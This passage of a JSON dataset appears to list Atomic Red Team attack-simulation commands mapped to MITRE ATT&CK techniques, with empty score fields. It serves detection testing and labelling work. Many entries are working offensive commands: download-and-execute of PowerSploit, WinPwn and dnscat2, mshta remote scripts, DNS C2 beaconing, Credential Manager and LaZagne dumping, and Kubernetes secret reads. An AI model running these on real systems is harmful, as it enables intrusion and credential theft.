        "Command": " c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs",
        "Description": "    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.\n    The script will execute 'whoami' then exit.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1581,
        "Command": "for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \"TXT\" \"atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\" -QuickTimeout}\n",
        "Description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.004",
        "Shell": "powershell"
    },
    {
        "ID": 1582,
        "Command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30\n",
        "Description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.004",
        "Shell": "powershell"
    },
    {
        "ID": 1583,
        "Command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT\n",
        "Description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.004",
        "Shell": "powershell"
    },
    {
        "ID": 1584,
        "Command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1\n",
        "Description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.004",
        "Shell": "powershell"
    },
    {
        "ID": 1585,
        "Command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"\n",
        "Description": "Connecting To Remote Shares\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1586,
        "Command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$\n",
        "Description": "Map Admin share utilizing PowerShell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.002",
        "Shell": "powershell"
    },
    {
        "ID": 1587,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe\n",
        "Description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1588,
        "Command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n",
        "Description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1589,
        "Command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();\n",
        "Description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 1590,
        "Command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n",
        "Description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 1591,
        "Command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force -ErrorAction Ignore\nstop-process -name \"CalculatorApp\" -Force -ErrorAction Ignore\n",
        "Description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1592,
        "Command": "Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe",
        "Description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1593,
        "Command": "Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick",
        "Description": "Executes an HTA Application using JScript script engine simulating double click.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1594,
        "Command": "Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe",
        "Description": "Executes an HTA Application by directly downloading from remote URI.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1595,
        "Command": "Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe",
        "Description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1596,
        "Command": "Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe",
        "Description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1597,
        "Command": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe",
        "Description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "powershell"
    },
    {
        "ID": 1598,
        "Command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\"\n",
        "Description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 1599,
        "Command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\ndocker run --name t1612_container --rm -d -t t1612\ndocker exec t1612_container ./test.sh",
        "Description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1612",
        "Shell": "sh"
    },
    {
        "ID": 1600,
        "Command": "netsh wlan show profile * key=clear",
        "Description": "Upon successful execution, information about previously connected Wi-Fi networks will be displayed with their corresponding key (if present).",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1601,
        "Command": "kubectl get secrets --all-namespaces\n",
        "Description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.\n[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).\n\nThis test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.007",
        "Shell": "bash"
    },
    {
        "ID": 1602,
        "Command": "kubectl get secrets -n default\n",
        "Description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.007",
        "Shell": "bash"
    },
    {
        "ID": 1603,
        "Command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n",
        "Description": "Access the Kubernetes service account access token stored within a container in a cluster.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.007",
        "Shell": "sh"
    },
    {
        "ID": 1604,
        "Command": "Enable-PSRemoting -Force\n",
        "Description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.006",
        "Shell": "powershell"
    },
    {
        "ID": 1605,
        "Command": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",
        "Description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.006",
        "Shell": "powershell"
    },
    {
        "ID": 1606,
        "Command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1",
        "Description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.006",
        "Shell": "powershell"
    },
    {
        "ID": 1607,
        "Command": "powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}",
        "Description": "Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.\n\nThis technique was observed in a [TheDFIRReport case](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) \nwhere the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.\n\nSuccessful execution will save matching log events to the users temp folder.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1654",
        "Shell": "powershell"
    },
    {
        "ID": 1608,
        "Command": "wevtutil enum-logs",
        "Description": "WevtUtil is a command line tool that can be utilised by adversaries to gather intelligence on a targeted Windows system's logging infrastructure. \n\nBy executing this command, malicious actors can enumerate all available event logs, including both default logs such as Application, Security, and System\nas well as any custom logs created by administrators. \n\nThis information provides valuable insight into the system's logging mechanisms, potentially allowing attackers to identify gaps or weaknesses in the logging configuration",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1654",
        "Shell": "command_prompt"
    },
    {
        "ID": 1609,
        "Command": "ping -n 4 8.8.8.8\n",
        "Description": "Check internet connection using ping on Windows. The default target of the ping is 8.8.8.8 (Google Public DNS).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1610,
        "Command": "ping -c 4 8.8.8.8\n",
        "Description": "Check internet connection using ping on Linux, MACOS. The default target of the ping is 8.8.8.8 (Google Public DNS).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.001",
        "Shell": "bash"
    },
    {
        "ID": 1611,
        "Command": "Test-NetConnection -ComputerName 8.8.8.8\n",
        "Description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the ICMP/Ping protocol. The default target is 8.8.8.8 (Google Public DNS).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.001",
        "Shell": "powershell"
    },
    {
        "ID": 1612,
        "Command": "Test-NetConnection -CommonTCPPort HTTP -ComputerName www.google.com\n",
        "Description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound HTTP (Port 80) access. The default target is www.google.com.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.001",
        "Shell": "powershell"
    },
    {
        "ID": 1613,
        "Command": "Test-NetConnection -CommonTCPPort SMB -ComputerName 8.8.8.8\n",
        "Description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound SMB (Port 445) access. The default target is 8.8.8.8.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1016.001",
        "Shell": "powershell"
    },
    {
        "ID": 1614,
        "Command": "df -aH\nsmbutil view -g //computer1\nshowmount computer1\n",
        "Description": "Network Share Discovery\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "sh"
    },
    {
        "ID": 1615,
        "Command": "smbstatus --shares\n",
        "Description": "Network Share Discovery using smbstatus\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "bash"
    },
    {
        "ID": 1616,
        "Command": "smbstatus --shares\n",
        "Description": "Network Share Discovery using smbstatus\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "sh"
    },
    {
        "ID": 1617,
        "Command": "net view \\\\localhost\n",
        "Description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution available network shares will be displayed in the powershell session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "command_prompt"
    },
    {
        "ID": 1618,
        "Command": "get-smbshare\n",
        "Description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, available network shares will be displayed in the powershell session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1619,
        "Command": "net share\n",
        "Description": "View information about all of the resources that are shared on the local computer Upon execution, available share drives will be displayed in the powershell session",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "command_prompt"
    },
    {
        "ID": 1620,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
        "Description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1621,
        "Command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder -CheckShareAccess\n",
        "Description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1622,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput",
        "Description": "Network share enumeration using the shareenumeration function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1623,
        "Command": "dir \\\\127.0.0.1\\c$\ndir \\\\127.0.0.1\\admin$\ndir \\\\127.0.0.1\\IPC$\n",
        "Description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution available network shares will be displayed in the commandline session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "command_prompt"
    },
    {
        "ID": 1624,
        "Command": "cmd /c 'PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe' /ldap:all | out-file -filepath \"$env:temp\\T1135SharpSharesOutput.txt\"",
        "Description": "SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. \nThis technique has been utilized by various ransomware groups, including BianLian.\n[Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1625,
        "Command": "invoke-expression 'cmd /c start powershell -command { cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\" -a -o \"$env:temp\\T1135SnafflerOutput.txt\" }; start-sleep 90; stop-process -name \"snaffler\"'\n",
        "Description": "Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. \n[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1135",
        "Shell": "powershell"
    },
    {
        "ID": 1626,
        "Command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"localhost\"\nquser\nqwinsta.exe /server:localhost\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n",
        "Description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "command_prompt"
    },
    {
        "ID": 1627,
        "Command": "users\nw\nwho\n",
        "Description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "sh"
    },
    {
        "ID": 1628,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n",
        "Description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "powershell"
    },
    {
        "ID": 1629,
        "Command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n",
        "Description": "Use the PowerShell environment variables to identify the current logged user.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "powershell"
    },
    {
        "ID": 1630,
        "Command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt\n",
        "Description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "powershell"
    },
    {
        "ID": 1631,
        "Command": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> $env:temp\\$file\n",
        "Description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "powershell"
    },
    {
        "ID": 1632,
        "Command": "set file=$env:temp\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%\n",
        "Description": "Identify the system owner or current user using native Windows command prompt utilities.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1033",
        "Shell": "command_prompt"
    },
    {
        "ID": 1633,
        "Command": "sudo xattr -d com.apple.quarantine myapp.app\n",
        "Description": "Gatekeeper Bypass via command line\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.001",
        "Shell": "sh"
    },
    {
        "ID": 1634,
        "Command": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n",
        "Description": "Creates a hidden file inside a hidden directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "sh"
    },
    {
        "ID": 1635,
        "Command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n",
        "Description": "Hide a file on MacOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "sh"
    },
    {
        "ID": 1636,
        "Command": "attrib.exe +s %temp%\\T1564.001.txt\n",
        "Description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1637,
        "Command": "attrib.exe +h %temp%\\T1564.001.txt\n",
        "Description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1638,
        "Command": "setfile -a V /tmp/evil\n",
        "Description": "Requires Apple Dev Tools\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "sh"
    },
    {
        "ID": 1639,
        "Command": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n",
        "Description": "Hide a directory on MacOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "sh"
    },
    {
        "ID": 1640,
        "Command": "defaults write com.apple.finder AppleShowAllFiles YES\n",
        "Description": "Show all hidden files on MacOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "sh"
    },
    {
        "ID": 1641,
        "Command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n",
        "Description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1642,
        "Command": "$file = Get-Item $env:temp\\T1564.001-9.txt -Force\n$file.attributes='Hidden'\n",
        "Description": "Creates a file and marks it as hidden through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"H\" Hidden.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "powershell"
    },
    {
        "ID": 1643,
        "Command": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n",
        "Description": "Creates a file and marks it as System through powershell. Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes is \"S\" System.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.001",
        "Shell": "powershell"
    },
    {
        "ID": 1644,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
        "Description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1645,
        "Command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n",
        "Description": "This module will extract the credentials from Windows Credential Manager",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1646,
        "Command": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n",
        "Description": "This module will extract the credentials from Windows Credential Manager",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1647,
        "Command": "vaultcmd /listcreds:\"Windows Credentials\" /all\n",
        "Description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1648,
        "Command": "vaultcmd /listcreds:\"Web Credentials\" /all\n",
        "Description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1649,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive",
        "Description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1650,
